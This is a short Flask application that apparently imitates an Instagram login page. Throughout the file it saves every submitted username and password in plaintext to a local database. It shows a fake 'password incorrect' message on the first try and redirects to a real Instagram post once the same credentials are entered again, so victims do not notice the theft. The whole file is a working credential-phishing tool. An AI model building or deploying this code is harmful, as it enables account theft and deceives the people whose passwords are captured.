import os

from cs50 import SQL
from flask import Flask, flash, redirect, render_template, request

# Configure application
app = Flask(__name__)

# Config SQL
db = SQL("sqlite:///accounts.db")


@app.after_request
def after_request(response):
    """Ensure responses aren't cached"""
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Expires"] = 0
    response.headers["Pragma"] = "no-cache"
    return response


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("index.html")
    else:
        username = request.form.get("username")
        password = request.form.get("password")

        existing_account = db.execute(
            "SELECT * FROM accounts WHERE username = ? AND password = ?",
            username,
            password,
        )

        if existing_account:
            if existing_account[0]["confirmed"] == "yes":
                return redirect("https://www.instagram.com/p/C0wpzdrqpOI/?img_index=1")
            else:
                db.execute(
                    "UPDATE accounts SET confirmed = ? WHERE username = ? AND password = ?",
                    "yes",
                    username,
                    password,
                )
                return redirect("https://www.instagram.com/p/C0wpzdrqpOI/?img_index=1")
        else:
            db.execute(
                "INSERT INTO accounts (username, password, confirmed) VALUES (?, ?, ?)",
                username,
                password,
                "no",
            )
            return render_template(
                "index.html",
                error="Sorry, your password was incorrect. Please double-check your password.",
            )
